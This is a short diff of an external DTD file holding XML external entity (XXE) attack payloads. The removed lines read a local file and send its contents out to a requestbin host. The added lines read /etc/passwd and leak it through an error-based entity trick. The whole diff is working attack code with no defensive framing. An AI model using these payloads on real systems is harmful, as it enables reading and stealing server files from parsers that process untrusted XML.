@@ -1,3 +1,4 @@
-<!ENTITY % payload SYSTEM "file:///next.txt">
-<!ENTITY % param "<!ENTITY &#x25; send SYSTEM 'http://requestbin.whapi.cloud/1g2tm8v1/?data=%payload;'>">
-%param;
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM '%data;:///'>">
+%eval;
+%leak;
